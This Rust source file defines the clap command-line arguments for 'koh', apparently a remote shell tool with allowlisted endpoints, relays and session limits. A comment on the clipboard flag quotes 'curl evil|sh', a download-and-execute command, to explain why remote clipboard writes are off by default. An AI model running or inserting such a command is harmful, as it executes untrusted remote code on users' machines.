//! Clap argument adapters for the `koh` binary (`cli` feature only).
//!
//! Every clap derive lives here, re-exported from its command's module. clap's derives emit
//! `#[allow(clippy::restriction, …)]`, which conflicts with the panic lints that the rest of the
//! crate `forbid`s (see `src/lib.rs`), so this module is kept outside that forbid. Cargo.toml's
//! crate-wide `deny` still applies here, so keep it to plain field-moving conversions.

use std::net::SocketAddr;
use std::path::PathBuf;

use clap::{Args, Subcommand};

/// Arguments for `koh id` (the clap adapter over [`IdConfig`](crate::idcmd::IdConfig)).
#[derive(Args, Debug)]
pub struct IdArgs {
    /// Path to the client's persistent secret key.
    #[arg(long)]
    key_file: Option<PathBuf>,
}

impl From<IdArgs> for crate::idcmd::IdConfig {
    fn from(a: IdArgs) -> Self {
        Self {
            key_file: a.key_file,
        }
    }
}

/// Arguments for `koh key` (the clap adapter over [`KeyConfig`](crate::keycmd::KeyConfig)).
#[derive(Args, Debug)]
pub struct KeyArgs {
    #[command(subcommand)]
    cmd: KeyCmd,
    /// Which identity key to operate on. Defaults to the client key path (as `koh id` uses); pass a
    /// server key explicitly to manage it.
    #[arg(long, global = true)]
    key_file: Option<PathBuf>,
}

#[derive(Subcommand, Debug)]
enum KeyCmd {
    /// Change the passphrase encrypting the identity key (like `ssh-keygen -p`). The key stays
    /// encrypted — there is no way to store it in plaintext.
    Passwd,
    /// Print the key's encryption status and endpoint id (never the secret).
    Info,
    /// Delete an unused identity; the next use creates a new endpoint ID.
    Reset {
        /// Acknowledge permanent identity loss and required allowlist updates.
        #[arg(long)]
        yes: bool,
    },
}

impl From<KeyArgs> for crate::keycmd::KeyConfig {
    fn from(a: KeyArgs) -> Self {
        Self {
            op: match a.cmd {
                KeyCmd::Passwd => crate::keycmd::KeyOp::Passwd,
                KeyCmd::Info => crate::keycmd::KeyOp::Info,
                KeyCmd::Reset { yes } => crate::keycmd::KeyOp::Reset { confirmed: yes },
            },
            key_file: a.key_file,
        }
    }
}

/// Arguments for `koh serve` (the clap adapter over [`ServeConfig`](crate::server::ServeConfig)).
#[derive(Args, Debug)]
pub struct ServeArgs {
    /// Path to the persistent secret-key file (gives a stable endpoint id across restarts).
    #[arg(long)]
    key_file: Option<PathBuf>,

    /// Authorize a client endpoint id (repeatable). At least one is required — koh only serves
    /// peers whose node-id is on this list.
    #[arg(long = "allow", value_name = "ENDPOINT_ID")]
    allow: Vec<String>,

    /// Program to run in the session (defaults to the user's login shell). Repeat to pass
    /// arguments: `--shell zellij --shell attach --shell -c --shell main` runs
    /// `zellij attach -c main`. The value is never split on whitespace.
    #[arg(long, value_name = "PROGRAM_OR_ARG")]
    shell: Vec<String>,

    /// Scrollback lines retained by the server-side emulator (per session). Bounded like the other
    /// resource knobs (`--max-connections`/`--max-sessions`) and by the emulator's per-buffer cell
    /// limit at the largest screen. 0 = no scrollback.
    #[arg(long, default_value_t = crate::server::cli::DEFAULT_SCROLLBACK, value_parser = clap::value_parser!(u64).range(0..=crate::server::cli::MAX_SCROLLBACK))]
    scrollback: u64,

    /// Keep a detached session's shell alive this long (seconds) for the client to reconnect.
    /// Default 24h (mosh-style "close the laptop, reopen later").
    #[arg(long, default_value_t = crate::server::cli::DEFAULT_SESSION_TTL_SECS)]
    session_ttl_secs: u64,

    /// Host via a self-hosted relay URL instead of n0's public relays.
    #[arg(long, value_name = "URL")]
    relay_url: Option<String>,

    /// Bind without any relay/discovery (LAN / loopback). Clients dial with --direct <ip:port>.
    #[arg(long, conflicts_with = "relay_url")]
    local: bool,

    /// Maximum number of connections being handled concurrently (each holds a permit for its whole
    /// lifetime; excess incoming connections are refused cheaply, before the crypto handshake). This
    /// bounds the work a flood of dials can pin on the server before the allowlist check rejects them.
    #[arg(long, default_value_t = crate::server::cli::DEFAULT_MAX_CONNECTIONS, value_parser = clap::value_parser!(u32).range(1..))]
    max_connections: u32,

    /// Maximum number of distinct live sessions (one per authorized peer). A new peer is refused
    /// once this many sessions exist; reconnecting to an existing session is always allowed. Bounds
    /// the number of real shells a flood of authorized keys can spawn.
    #[arg(long, default_value_t = crate::server::cli::DEFAULT_MAX_SESSIONS, value_parser = clap::value_parser!(u32).range(1..))]
    max_sessions: u32,
}

impl From<ServeArgs> for crate::server::ServeConfig {
    fn from(a: ServeArgs) -> Self {
        Self {
            key_file: a.key_file,
            allow: a.allow,
            command: a.shell,
            scrollback: a.scrollback,
            session_ttl_secs: a.session_ttl_secs,
            relay_url: a.relay_url,
            local: a.local,
            max_connections: a.max_connections,
            max_sessions: a.max_sessions,
        }
    }
}

/// Arguments for `koh connect <server-id>` (the clap adapter over [`ConnectConfig`](crate::client::ConnectConfig)).
#[derive(Args, Debug)]
pub struct ConnectArgs {
    /// Server endpoint id to connect to.
    server: String,

    /// Path to the client's persistent secret key (its endpoint id must be on the server's allowlist).
    #[arg(long)]
    key_file: Option<PathBuf>,

    /// Dial the server at a direct socket address (LAN / loopback; no relay or discovery).
    #[arg(long, value_name = "IP:PORT", conflicts_with = "relay_url")]
    direct: Option<SocketAddr>,

    /// Dial the server via a self-hosted relay URL instead of n0's public relays.
    #[arg(long, value_name = "URL")]
    relay_url: Option<String>,

    /// Honor remote OSC-52 clipboard writes (let the remote app set your system clipboard).
    /// OFF by default: a malicious/compromised server could otherwise silently overwrite your
    /// clipboard (e.g. swap a copied command for `curl evil|sh`). A deliberate per-session opt-in.
    #[arg(long)]
    clipboard: bool,

    /// Run this shell command whenever the remote bell rings (e.g. on Termux:
    /// `--on-bell 'termux-notification -t "koh bell"'`). Detached from the terminal; at most one
    /// spawn per second. KOH_BELL_COUNT and KOH_TITLE are set in its environment. Bells that rang
    /// before you attached do not fire it; bells during a reconnect do.
    #[arg(long, value_name = "CMD")]
    on_bell: Option<String>,
}

impl From<ConnectArgs> for crate::client::ConnectConfig {
    fn from(a: ConnectArgs) -> Self {
        Self {
            server: a.server,
            key_file: a.key_file,
            direct: a.direct,
            relay_url: a.relay_url,
            clipboard: a.clipboard,
            bell_command: a.on_bell,
        }
    }
}
